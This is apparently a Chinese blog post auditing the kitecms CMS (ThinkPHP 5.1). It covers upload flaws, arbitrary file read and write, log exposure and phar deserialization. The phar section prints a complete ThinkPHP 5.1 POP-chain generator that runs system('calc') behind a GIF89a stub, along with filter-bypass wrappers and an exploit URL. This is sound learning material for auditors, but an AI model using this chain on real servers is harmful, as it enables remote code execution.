---
title: kitecms代码审计
date: 2024年10月11日
updated: 2024年10月11日
tags:
  - 代码审计
categories: 代码审计
keywords:
description: 代码审计

---

kitecms是基于thinkphp5搭建的，这个我搭建的时候按照两个方法都失败了，访问`/install`的时候安装不跳转，数据库安装倒是成功了`/config/database.php`也配置好了但是访问的时候报错

就很奇怪

所以我就单纯的看着教程和源码进行审计学习了

thinkphp5.1比较上一代5.0，将配置目录和路由定义单独出来不在防御应用类库目录中（不可更改哦）

## 目录架构

```
www WEB部署目录（或者子目录）
├─application           应用目录
│ ├─common             公共模块目录（可以更改）
│ ├─module_name       模块目录
│ │ ├─common.php     模块函数文件
│ │ ├─controller     控制器目录
│ │ ├─model           模型目录
│ │ ├─view           视图目录
│ │ ├─config         配置目录
│ │ └─ ...           更多类库目录
│ │
│ ├─command.php       命令行定义文件
│ ├─common.php         公共函数文件
│ └─tags.php           应用行为扩展定义文件
│
├─config               应用配置目录
│ ├─module_name       模块配置目录
│ │ ├─database.php   数据库配置
│ │ ├─cache           缓存配置
│ │ └─ ...
│ │
│ ├─app.php           应用配置 相当于5.0中config.php
│ ├─cache.php         缓存配置
│ ├─cookie.php         Cookie配置
│ ├─database.php       数据库配置
│ ├─log.php           日志配置
│ ├─session.php       Session配置
│ ├─template.php       模板引擎配置
│ └─trace.php         Trace配置
│
├─route                 路由定义目录
│ ├─route.php         路由定义
│ └─...               更多
│
├─public               WEB目录（对外访问目录）
│ ├─index.php         入口文件
│ ├─router.php         快速测试文件
│ └─.htaccess         用于apache的重写
│
├─thinkphp             框架系统目录
│ ├─lang               语言文件目录
│ ├─library           框架类库目录
│ │ ├─think           Think类库包目录
│ │ └─traits         系统Trait目录
│ │
│ ├─tpl               系统模板目录
│ ├─base.php           基础定义文件
│ ├─convention.php     框架惯例配置文件
│ ├─helper.php         助手函数文件
│ └─logo.png           框架LOGO文件
│
├─extend               扩展类库目录
├─runtime               应用的运行时目录（可写，可定制）
├─vendor               第三方类库目录（Composer依赖库）
├─build.php             自动生成定义文件（参考）
├─composer.json         composer 定义文件
├─LICENSE.txt           授权说明文件
├─README.md             README 文件
├─think                 命令行入口文件


```
## 代码审计

由于该系统使用的是thinkphp框架，所以我们在审计的时候需要着重观察application文件夹下面的文件，

```
├admin                        后台代码
├index                        前台代码
├install                      安装代码
├member                       用户注册以及会员的响应代码
```


### 文件上传漏洞

（我没搭建成功，所以用的是教程里面的）

![](https://pic.imgdb.cn/item/6708c4bdd29ded1a8c820b42.png)
这里是对上传的文件进行了配置，

这里教程选择抓包查看路由配置信息

![](https://pic.imgdb.cn/item/6708cf8bd29ded1a8c8b3bc4.png)

`admin`的`site`的`config`，这里的html是伪静态，其实还是调用的`config()`方法

（我们可以在`config`的`app.php`中看到他开了伪静态）

![](https://pic.imgdb.cn/item/6708d18bd29ded1a8c8cd1f8.png)

打开`site.php`，查看里面的`config`函数

![](https://pic.imgdb.cn/item/6708d864d29ded1a8c92876f.png)


20行调用了`isAjax`判断是否是Ajax请求，然后通过`Request::param`获取来自前端的数据并存储到`$request`中，

![](https://pic.imgdb.cn/item/6708e17dd29ded1a8c9be074.png)

刚刚应该是在哦后台的时候添加了一个php的文件使得其可传输，所以我们我们抓一个上传的包看一眼就可以了

上传包中都调用了`uploadFile`方法，全局搜索一下


![](https://pic.imgdb.cn/item/6708e213d29ded1a8c9c9ea2.png)


这里调用了`Request::file`函数接收来自上传的文件,

这里启了一个uploadfile的函数是获取当前站点id然后创建一个新的`uploadfile`的实例，跟踪一下

![](https://pic.imgdb.cn/item/6708e2e0d29ded1a8c9d8d80.png)

![](https://pic.imgdb.cn/item/6708e354d29ded1a8c9df8c6.png)

首先从`config\site.php`获取site中的`uploadfile`和`imagewater`并且将其通过`array_merge`合并到一起，然后获取我们之前传入数据库的内容与配置文件进行合并

![](https://pic.imgdb.cn/item/6708e55bd29ded1a8ca06927.png)

这里也做了一些限制

继续顺着`uploadfile`，下面调用了`upload`函数，这里使用了`filetype`获取上传类型然后通过check检查后缀以及大小

![](https://pic.imgdb.cn/item/6708e600d29ded1a8ca129fd.png)

case完了以后通过`upload`实现文件上传


所以我们只需要在后台设置`.php`可上传，然后传就可以了

## 任意文件读写

通过全局搜索我们发现存在`file_put_contents`函数，

![](https://pic.imgdb.cn/item/670906eed29ded1a8cc0288e.png)

而且里面的`html`参数可控，也就是说`file_put_contents`传入的内容可控

`htmlspecialchars_decode`是将由`htmlspecialchars`转换的html尸体进行解码，在前面的`rootpath`向上回溯发现是将根路径、主题文件夹、主题名称和文件相对路径拼接成一个完整的文件路径

![](https://pic.imgdb.cn/item/670909e1d29ded1a8cc24cef.png)

这里的`$rootpath`通过param接收`$path`，而path是request获得的path路径，所以这个地方的`$path`可控

![](https://pic.imgdb.cn/item/67090af7d29ded1a8cc31ab3.png)

![](https://pic.imgdb.cn/item/67090b05d29ded1a8cc32612.png)

![](https://pic.imgdb.cn/item/67090a8bd29ded1a8cc2cf87.png)

这里 相当于本来在`404.txt`中写但是改成了在`robots.txt`中加了一句`ceshi`,实现了任意文件读写

## 任意文件读取

全局搜索`file_get_contents`，发现在上面那个`file_put_contents`的在一个函数中，分析一下发现

![](https://pic.imgdb.cn/item/6709262cd29ded1a8cd89d33.png)

他判断是不是post传参，如果不是的话走下面的else判断里面的`rootpath`，上面我们分析了`rootpath`里面的`$path`可控，所以这里会造成任意文件读取


![](https://pic.imgdb.cn/item/670927f3d29ded1a8cd9facd.png)

它上面最后调用了
```
            return $this->fetch('fileedit', $data);
```
渲染`filedit`并将`$data`传给他

所以存在任意文件读取

![](https://pic.imgdb.cn/item/67092889d29ded1a8cda81b5.png)


![](https://pic.imgdb.cn/item/670928a6d29ded1a8cda9cda.png)


## phar反序列化

php使用的是内置的流包装器实现复杂的文件处理共嗯，内置包装器可用与文件系统函数

```常见的流包装器

file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流


```

![](https://pic.imgdb.cn/item/6709305dd29ded1a8ce15840.png)

### phar生成
```
<?php
    class TestObject {
    }
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $o -> data='hu3sky';
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>

```
### phar文件必要的结构组成
>stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?> 结尾，否则无法识别。xxx可以为自定义内容。

>manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。

>content:被压缩文件的内容

>signature (可空):签名，放在末尾。

### 绕过方法：
环境限制phar不能出现在前面的字符中，可以使用`compress.bzip2://`和`compress.bzip://`进行绕过

```
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt

```

或者使用其他协议

```
php://filter/read=convert.base64-encode/resource=phar://phar.phar


```

GIF格式验证中可以通过在文件头部添加GIT89a绕过

```
- $phar->setStub("GIF89a","<?php __HALT_COMPILER();?>");

- 生成一个phar.phar 改名为phar.gif
```

### 危害

攻击者可以通过PHAR反序列化漏洞来实现一下攻击：
1. 远程代码执行：攻击者可以利用反序列化漏洞来远程执行任意php代码并获取服务器完全控制权
2. 信息泄露：攻击者可以利用反序列化漏洞来读取服务器上的敏感数据，如数据库凭证，身份验证密码等
3. 篡改数据：攻击者可以利用反序列化漏洞改变服务器上的数据，如篡改网站内容，篡改数据库数据等

### 防范措施

1. 及时更新代码中利用phar的库或插件，以修复已知的漏洞
2. 对用户输入的信息进行过滤和验证，确保输入的数据不包含恶意代码
3. 金庸不必要的反序列化对象或者对反序列化对象进行严格控制
4. 使用php的反序列化检测攻击检查潜在的远程代码执行漏洞

这里的`$dir`参数完全可控，并且进入`is_dir()`

![](https://pic.imgdb.cn/item/670a40cdd29ded1a8cb1d949.png)

写tp5.1反序列化利用链生成phar文件
```
<?php
namespace think\process\pipes {
  class Windows
 {
    private $files;
    public function __construct($files)
   {
      $this->files = [$files];
   }
 }
}
namespace think\model\concern {
  trait Conversion
 {
 }
  trait Attribute
 {
    private $data;
    private $withAttr = ["v" => "system"];
    public function get()
   {
      $this->data = ["v" => "calc"];
   }
 }
#这里生成我们的pahr文件，如果生成时报错了可以将php.ini配置文件中的phar.readonly选项设置为
#Off就可以成功生成了。

}
namespace think {
  abstract class Model
 {
    use model\concern\Attribute;
    use model\concern\Conversion;
 }
}
namespace think\model{
  use think\Model;
  class Pivot extends Model
 {
    public function __construct()
   {
      $this->get();
   }
 }
}
namespace {
  $conver = new think\model\Pivot();
  $a = new think\process\pipes\Windows($conver);
  @unlink("phar.phar");
  $phar = new Phar("phar.phar"); //后缀名必须为phar
  $phar->startBuffering();
  $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); //设置stub
  $phar->setMetadata($a); //将自定义的meta-data存入manifest
  $phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
  $phar->stopBuffering();
}
?>
```

打开访问会自动生成`phar.phar`（如果报错的话是因为你的`php.ini`里面没打开`phar_onreadly=off`）

![](https://pic.imgdb.cn/item/670b4891d29ded1a8c85b6c1.png)

在010editor里面能看到我们的数据都写进去了

![](https://pic.imgdb.cn/item/670b48b0d29ded1a8c85ccf0.png)

漏洞复现里面是在kitecms里面上传了phar.phar，改后缀为`.jpg`,

![](https://pic.imgdb.cn/item/670b4912d29ded1a8c861136.png)

用phar协议解析就可以弹计算器

![](https://pic.imgdb.cn/item/670b4949d29ded1a8c8636fb.png)

![](https://pic.imgdb.cn/item/670b497ad29ded1a8c865846.png)

顺便补一句这个下面的`$dir`也是可控的，所以也可以利用

http://127.0.0.1/admin/admin/scanFilesForTree?dir=phar://地址

## 日志文件泄露

![](https://pic.imgdb.cn/item/670b4ff7d29ded1a8c8e0aa3.png)

在`config/app.php/log`中开启了调试模式，

![](https://pic.imgdb.cn/item/670b505bd29ded1a8c8f353c.png)

也就是说开启了日志记录

https://pic.imgdb.cn/item/670b50a9d29ded1a8c902826.png

在日志配置文件`config/log.php`里面发现默认开启了日志记录

访问`/runtime/log`目录，使用bp求情就能得到log日志文件

## 文件上传第二处

`application/member/controller/Upload.php`

![](https://pic.imgdb.cn/item/670b524ed29ded1a8c983e37.png)

跟踪一下`upload`函数发现

他只检查了后缀和大小，

![](https://pic.imgdb.cn/item/670b52b8d29ded1a8c993f0a.png)

所以可以在会员中心，对着这个

![](https://pic.imgdb.cn/item/670b5317d29ded1a8c9a4b8d.png)

然后修改上传的png为php

![](https://pic.imgdb.cn/item/670b532fd29ded1a8c9aca51.png)

就能访问到phpinfo文件了


